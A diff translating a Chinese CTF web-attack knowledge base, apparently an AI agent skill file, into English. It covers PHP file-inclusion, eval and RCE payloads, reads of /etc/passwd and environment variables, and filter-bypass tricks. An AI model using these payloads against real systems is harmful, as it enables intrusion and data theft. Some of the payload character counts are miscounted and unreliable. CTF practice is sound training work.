@@ -1,170 +1,170 @@
 ---
 name: ctf-web
-description: CTF Web攻击知识库 — PHP弱比较绕过、命令注入空格绕过、eval回显技巧、SSTI注入链、反序列化利用链、PHP代码审计checklist、常见flag位置
+description: CTF Web attack knowledge base — PHP weak-comparison bypass, command injection space bypass, eval echo tricks, SSTI injection chains, deserialization exploit chains, PHP code-audit checklist, common flag locations
 ---
 
-# CTF Web 攻击知识库
+# CTF Web Attack Knowledge Base
 
-针对 CTF Web 题目的实战知识库，提供**具体绕过值、payload 模板、代码审计 checklist**，而非渗透测试方法论。
+A hands-on knowledge base for CTF Web challenges. Provides **concrete bypass values, payload templates, and code-audit checklists** — not general pentest methodology.
 
-**与 `web-security-advanced` 的区别**：
-- `web-security-advanced` → 渗透测试方法论（怎么系统性测试一个 Web 应用）
-- `ctf-web` → CTF 实战知识库（PHP 弱比较用什么值、空格怎么绕过、eval 输出怎么回显）
+**Difference from `web-security-advanced`**:
+- `web-security-advanced` → Pentest methodology (how to systematically test a web app)
+- `ctf-web` → CTF hands-on knowledge (which MD5 values to use for weak comparison, how to bypass spaces, how to get eval output)
 
-## 核心原则
+## Core Principles
 
-1. **精确值优于方法论** — 提供可直接使用的绕过值和 payload，而非"可以尝试"的建议
-2. **工具验证** — 所有 payload 必须用 `fetch` 或 `python_execute` 工具实际发送验证，不猜测结果
-3. **路径选择** — 多条利用路径时，优先选过滤最少、最简单的
-4. **失败记录** — 某个 payload 失败后立即记录，不重复尝试
+1. **Exact values over methodology** — provide bypass values and payloads you can use directly, not "you can try" suggestions
+2. **Tool verification** — all payloads must be actually sent and verified with `fetch` or `python_execute` tools; never guess results
+3. **Path selection** — when multiple exploit paths exist, prefer the one with the fewest filters and simplest approach
+4. **Record failures** — log a failed payload immediately and don't retry it
 
-## First-Pass 工作流（CTF Web 题标准流程）
+## First-Pass Workflow (Standard CTF Web Flow)
 
-1. 访问目标 URL，查看页面源码、HTTP 头、Cookie
-2. **如源码含 `highlight_file` → 用 python_execute + strip_tags 提取纯源码**（fetch 输出可能误读）
-3. 检查 robots.txt、.git/、.svn/、备份文件（index.php.bak、www.zip 等）
-4. 目录扫描（常见：/flag、/admin、/login、/upload、/api）
-5. 如有源码 → 进入代码审计模式（见 `php-code-audit-checklist.md`）
-6. 如无源码 → 主动探测注入点、上传点、文件包含
+1. Visit the target URL; view page source, HTTP headers, Cookies
+2. **If source uses `highlight_file` → extract clean source with python_execute + strip_tags** (fetch output may be misread)
+3. Check robots.txt, .git/, .svn/, backup files (index.php.bak, www.zip, etc.)
+4. Directory scan (common: /flag, /admin, /login, /upload, /api)
+5. If source available → enter code audit mode (see `php-code-audit-checklist.md`)
+6. If no source → actively probe injection points, upload endpoints, file inclusion
 
-## 场景路由
+## Scenario Routing
 
-| 场景 | 参考文档 | 核心内容 |
-|------|---------|---------|
-| ⭐ PHP 伪协议读文件（遇到文件包含/参数传文件名时优先尝试） | 见下方「PHP 伪协议速查」 | `php://filter` 直接读源码/flag |
-| 源码提取 | `source-code-extraction.md` | strip_tags 提取、php://filter、.phps、备份文件、完整性校验 |
-| PHP 弱比较/类型绕过 | `php-bypass-cheatsheet.md` | 0e 开头 MD5 值大全、数组绕过、extract() 覆写 |
-| ⭐ MD5 弱比较碰撞（`md5(a)==md5(b)` 弱比较） | `php-bypass-cheatsheet.md` | ⚠️ 0e 后必须纯数字！直接用 `QNKCDZO`+`240610708` 等已验证值 |
-| ⭐ preg_replace/str_replace 双写绕过 | 见下方「双写绕过速查」 | `NSSNSSCTFCTF` → 替换后 = `NSSCTF` |
-| 命令注入空格绕过 | `command-injection-bypass.md` | ${IFS}/$IFS$9/</%09/%0a 全表 |
-| eval/RCE 技巧 | `eval-and-rce-techniques.md` | system/exec/passthru 区别、highlight_file 输出顺序、无回显外带 |
-| SSTI 注入链 | `ssti-injection-chains.md` | Jinja2/Twig/ERB/Mako 等注入链速查 |
-| 反序列化利用链 | `deserialization-playbook.md` | PHP/Java/Python 反序列化、SoapClient CRLF |
-| 文件上传 → RCE | `file-upload-to-rce.md` | .htaccess 绕过、日志投毒、多语言 Webshell |
-| CTF 快速参考 | `web-ctf-quick-reference.md` | flag 位置、常见链形状、响应头 hint |
-| PHP 代码审计 | `php-code-audit-checklist.md` | 输入入口→过滤→危险函数→输出分析 |
+| Scenario | Reference | Core Content |
+|----------|-----------|--------------|
+| ⭐ PHP pseudo-protocols to read files (try first when file inclusion/filename parameter found) | see "PHP Pseudo-Protocol Quick Reference" below | `php://filter` reads source/flag directly |
+| Source code extraction | `source-code-extraction.md` | strip_tags extraction, php://filter, .phps, backup files, integrity check |
+| PHP weak comparison / type juggling bypass | `php-bypass-cheatsheet.md` | Full list of 0e-prefix MD5 values, array bypass, extract() overwrite |
+| ⭐ MD5 weak comparison collision (`md5(a)==md5(b)` weak compare) | `php-bypass-cheatsheet.md` | ⚠️ Digits only after 0e! Use pre-verified values like `QNKCDZO`+`240610708` |
+| ⭐ preg_replace/str_replace double-write bypass | see "Double-Write Bypass Quick Reference" below | `NSSNSSCTFCTF` → after replacement = `NSSCTF` |
+| Command injection space bypass | `command-injection-bypass.md` | ${IFS}/$IFS$9/</%09/%0a full table |
+| eval/RCE tricks | `eval-and-rce-techniques.md` | system/exec/passthru differences, highlight_file output order, blind exfiltration |
+| SSTI injection chains | `ssti-injection-chains.md` | Jinja2/Twig/ERB/Mako injection chain quick reference |
+| Deserialization exploit chains | `deserialization-playbook.md` | PHP/Java/Python deserialization, SoapClient CRLF |
+| File upload → RCE | `file-upload-to-rce.md` | .htaccess bypass, log poisoning, polyglot webshell |
+| CTF quick reference | `web-ctf-quick-reference.md` | Flag locations, common chain shapes, response header hints |
+| PHP code audit | `php-code-audit-checklist.md` | Input entry → filter → dangerous function → output analysis |
 
-## ⭐ PHP 伪协议速查（文件包含/参数传文件名时优先尝试）
+## ⭐ PHP Pseudo-Protocol Quick Reference (Try first when file inclusion/filename param found)
 
-**触发条件**：当题目出现以下任一特征时，**先试 php://filter 再想其他方法**：
+**Trigger conditions**: When the challenge has any of the following characteristics, **try php://filter before anything else**:
 
-| 触发特征 | 示例 |
-|---------|------|
-| 参数接受文件名/路径 | `?file=xxx` / `?page=xxx` / `?num=xxx` / `?path=xxx` |
-| `include` / `require` / `include_once` | 源码中有这些函数 |
-| 页面展示源码 | `highlight_file()` / `show_source()` |
-| 题目要求"读文件"或"找 flag" | 明确要读取服务器文件 |
+| Trigger | Example |
+|---------|---------|
+| Parameter accepts filename/path | `?file=xxx` / `?page=xxx` / `?num=xxx` / `?path=xxx` |
+| `include` / `require` / `include_once` | these functions in source |
+| Page shows source code | `highlight_file()` / `show_source()` |
+| Challenge asks to "read file" or "find flag" | explicitly reads server files |
 
-### 伪协议 Payload 速查
+### Pseudo-Protocol Payload Quick Reference
 
 ```
-# 1. 读 PHP 源码（base64 编码，避免 PHP 执行）
+# 1. Read PHP source (base64-encoded, prevents PHP execution)
 ?file=php://filter/read=convert.base64-encode/resource=flag.php
 ?file=php://filter/read=convert.base64-encode/resource=index.php
 
-# 2. 读 PHP 源码（rot13 编码）
+# 2. Read PHP source (rot13 encoding)
 ?file=php://filter/read=string.rot13/resource=flag.php
 
-# 3. 直接读文件（如 .txt/.log 等非 PHP 文件）
+# 3. Read file directly (non-PHP files like .txt/.log)
 ?file=php://filter/resource=/etc/passwd
 
-# 4. 代码执行
-?file=php://input  (POST body 中放 PHP 代码)
+# 4. Code execution
+?file=php://input  (place PHP code in POST body)
 ?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgL2ZsYWcnKTs/Pg==
 ```
 
-### ⚠️ 关键提醒
+### ⚠️ Key Reminders
 
-1. **不要只想着"绕过"，先想能不能"直接读"** — 很多题目的参数接受文件名，可以直接用伪协议读 flag.php，根本不需要绕过任何过滤
-2. **`convert.base64-encode` 是万能读取器** — PHP 文件被 include 会执行，但 base64 编码后不会执行，可以拿到源码
-3. **参数名不一定叫 `file`** — 可能是 `page`、`num`、`path`、`template` 等，只要参数值被当作文件路径/名处理就可能有效
-4. **拿到 base64 后用 `crypto_decode` 工具解码** — 不要自己脑补解码结果
+1. **Don't jump to "bypass" — first ask if you can "read directly"** — many challenges accept a filename parameter where you can read flag.php directly with a pseudo-protocol, no filter bypass needed
+2. **`convert.base64-encode` is the universal reader** — PHP files execute when included, but base64-encoded they don't, so you get the source
+3. **Parameter name isn't always `file`** — could be `page`, `num`, `path`, `template`, etc. — any parameter treated as a file path/name may work
+4. **After getting base64, use `crypto_decode` tool to decode** — don't mentally reconstruct the result yourself
 
-## 常见 flag 位置速查
+## Common Flag Location Quick Reference
 
-**⚠️ RCE 得手后，必须按以下优先级测试 flag 位置，不要停留在当前目录的 flag.php：**
+**⚠️ After getting RCE, test flag locations in this priority order — don't stop at flag.php in the current directory:**
 
 ```
-优先级 1（最常见）: cat /flag
-优先级 2:           cat /flag.txt
-优先级 3:           ls /  → 找到根目录的 flag 文件名
-优先级 4:           cat /var/www/html/flag.php
-优先级 5:           cat /home/ctf/flag
-优先级 6:           cat /root/flag
-其他位置:           /environment, /proc/self/environ, env 命令
+Priority 1 (most common): cat /flag
+Priority 2:               cat /flag.txt
+Priority 3:               ls /  → find the flag filename in root
+Priority 4:               cat /var/www/html/flag.php
+Priority 5:               cat /home/ctf/flag
+Priority 6:               cat /root/flag
+Other locations:          /environment, /proc/self/environ, env command
 ```
 
-**注意**：`ls` 默认列当前目录（`/var/www/html/`），根目录的 `/flag` 需要 `ls /` 才能看到。
+**Note**: `ls` lists the current directory (`/var/www/html/`) by default; root-level `/flag` requires `ls /` to see.
 
-## 常见 CTF Web 题型速判
+## Common CTF Web Challenge Type Quick Identification
 
-| 题目特征 | 可能考点 | 推荐参考 |
-|---------|---------|---------|
-| 参数接受文件名/路径 | ⭐ **先试 php://filter 读 flag** | 见上方「PHP 伪协议速查」 |
-| 页面只有登录框 | SQL 注入 / 弱口令 / 条件竞争 | php-bypass-cheatsheet.md |
-| 页面有代码展示 | 代码审计 | php-code-audit-checklist.md |
-| eval/system 字样 | RCE + 空格/关键字绕过 | eval-and-rce-techniques.md + command-injection-bypass.md |
-| eval + 长度限制 | RCE + `$_GET` 链式传参绕长度 | 见下方「RCE + 长度限制绕过」 |
-| 文件上传功能 | 后缀绕过 / MIME 绕过 | file-upload-to-rce.md |
-| 页面模板渲染 | SSTI | ssti-injection-chains.md |
-| 序列化/反序列化 | PHP/Java 反序列化 | deserialization-playbook.md |
-| 有 WAF/过滤提示 | 正则绕过 / 编码绕过 | php-bypass-cheatsheet.md + command-injection-bypass.md |
+| Challenge characteristic | Likely focus | Recommended reference |
+|--------------------------|--------------|----------------------|
+| Parameter accepts filename/path | ⭐ **Try php://filter to read flag first** | See "PHP Pseudo-Protocol Quick Reference" above |
+| Page only shows login form | SQL injection / weak password / race condition | php-bypass-cheatsheet.md |
+| Page shows code | Code audit | php-code-audit-checklist.md |
+| eval/system in source | RCE + space/keyword bypass | eval-and-rce-techniques.md + command-injection-bypass.md |
+| eval + length limit | RCE + `$_GET` chained param to bypass length | see "RCE + Length Limit Bypass" below |
+| File upload feature | Extension bypass / MIME bypass | file-upload-to-rce.md |
+| Page uses template rendering | SSTI | ssti-injection-chains.md |
+| Serialize/deserialize | PHP/Java deserialization | deserialization-playbook.md |
+| WAF/filter hints | Regex bypass / encoding bypass | php-bypass-cheatsheet.md + command-injection-bypass.md |
 
-## RCE + 长度限制绕过（首推策略）
+## RCE + Length Limit Bypass (Preferred Strategy)
 
-当 `eval()` 有 `strlen()` 长度限制时（如 ≤ 18 字符），**首推 `$_GET` 链式传参**：
+When `eval()` has a `strlen()` length limit (e.g. ≤ 18 chars), **use `$_GET` chained parameter passing**:
 
-### 标准解法
+### Standard Solution
 
 ```
 ?get=eval($_GET['A']);&A=system('cat /flag');
 ```
 
-**原理**：
-- `eval($_GET['A'])` = 16 字符，通过长度限制
-- 真正的命令在第二个 GET 参数 `A` 中，没有长度限制
-- PHP 会先执行 `eval()`，将 `$_GET['A']` 的值作为 PHP 代码执行
+**How it works**:
+- `eval($_GET['A'])` = 16 characters, passes the length limit
+- The actual command is in the second GET parameter `A`, which has no length limit
+- PHP first executes `eval()`, treating `$_GET['A']`'s value as PHP code
 
-### 变体
+### Variants
 
-| 长度限制 | payload | 字符数 |
-|---------|---------|--------|
+| Length limit | Payload | Char count |
+|-------------|---------|------------|
 | ≤ 18 | `eval($_GET['A']);` | 16 |
 | ≤ 18 | `eval($_GET[0]);` | 14 |
-| ≤ 16 | `eval($_GET[A]);` | 13（无引号，PHP 自动转字符串） |
-| ≤ 12 | `$_GET[0]();` | 10（A 参数传函数名如 `system`，另一个参数传命令） |
+| ≤ 16 | `eval($_GET[A]);` | 13 (no quotes; PHP auto-converts to string) |
+| ≤ 12 | `$_GET[0]();` | 10 (pass function name like `system` in A, command in another param) |
 
-### 注意事项
-- 不要花时间在缩短 payload 上（如用 `?>` 退出 PHP 模式、用反引号等），**链式传参是通用解法**
-- 双 GET 参数 URL 格式：`?get=eval($_GET['A']);&A=system('cat /flag');`
-- 用 `python_execute` 工具构造请求，而非 fetch 工具（fetch 可能不支持多参数）
+### Notes
+- Don't waste time shortening the payload (e.g. using `?>` to exit PHP mode, backticks, etc.) — **chained params is the universal solution**
+- Dual GET param URL format: `?get=eval($_GET['A']);&A=system('cat /flag');`
+- Use `python_execute` tool to build the request, not the fetch tool (fetch may not support multiple params)
 
-## ⭐ preg_replace / str_replace 双写绕过速查
+## ⭐ preg_replace / str_replace Double-Write Bypass Quick Reference
 
-**触发条件**：源码含 `preg_replace('/X/', '', $str)` 或 `str_replace('X', '', $str)`，且替换后需 `$str === "X"`
+**Trigger condition**: Source has `preg_replace('/X/', '', $str)` or `str_replace('X', '', $str)`, and the replaced result must equal `"X"` exactly
 
-### 核心原理
-在关键词中间嵌入完整关键词，替换删除内层后，外层拼合出原词。
+### Core Principle
+Embed the complete keyword inside itself; after replacement removes the inner copy, the outer pieces concatenate to form the original word.
 
-### 通用构造公式
+### Universal Construction Formula
 ```
-输入 = 关键词前半 + 关键词 + 关键词后半
+Input = keyword_first_half + keyword + keyword_second_half
 ```
 
-### 常见过滤词速查表
+### Common Filter Word Quick Table
 
-| 过滤关键词 | 双写输入 | 替换过程 | 结果 |
-|-----------|---------|---------|------|
-| NSSCTF | `NSSNSSCTFCTF` | 删中间NSSCTF → NSS+CTF | `NSSCTF` ✅ |
-| flag | `flflagag` | 删中间flag → fl+ag | `flag` ✅ |
-| cat | `cacatt` | 删中间cat → ca+t | `cat` ✅ |
-| system | `syssystemtem` | 删中间system → sys+tem | `system` ✅ |
-| hack | `hahackck` | 删中间hack → ha+ck | `hack` ✅ |
-| cmd | `cmcmdd` | 删中间cmd → cm+d | `cmd` ✅ |
-| exec | `exexecec` | 删中间exec → ex+ec | `exec` ✅ |
+| Filtered keyword | Double-write input | Replacement process | Result |
+|-----------------|--------------------|---------------------|--------|
+| NSSCTF | `NSSNSSCTFCTF` | remove inner NSSCTF → NSS+CTF | `NSSCTF` ✅ |
+| flag | `flflagag` | remove inner flag → fl+ag | `flag` ✅ |
+| cat | `cacatt` | remove inner cat → ca+t | `cat` ✅ |
+| system | `syssystemtem` | remove inner system → sys+tem | `system` ✅ |
+| hack | `hahackck` | remove inner hack → ha+ck | `hack` ✅ |
+| cmd | `cmcmdd` | remove inner cmd → cm+d | `cmd` ✅ |
+| exec | `exexecec` | remove inner exec → ex+ec | `exec` ✅ |
 
-### ⚠️ 关键注意事项
-1. **大小写绕过不适用** — 替换后返回 `NssCTF`，不等于 `"NSSCTF"`，严格比较失败
-2. **识别信号** — 看到 `preg_replace('/X/', '', $str)` + `$str === "X"` → 立即双写
-3. **str_replace 同理** — `str_replace` 也是一次替换，双写同样有效
-4. **多次替换** — 如果代码多次调用 `preg_replace`，可能需要三写/四写，但 CTF 中通常只需双写
+### ⚠️ Key Notes
+1. **Case bypass doesn't work** — replacement returns `NssCTF`, which is not equal to `"NSSCTF"`, strict comparison fails
+2. **Identification signal** — see `preg_replace('/X/', '', $str)` + `$str === "X"` → apply double-write immediately
+3. **Same applies to str_replace** — `str_replace` is also a single-pass replacement, double-write works the same
+4. **Multiple replacements** — if the code calls `preg_replace` multiple times, you may need triple/quadruple-write, but CTF challenges usually only need double-write
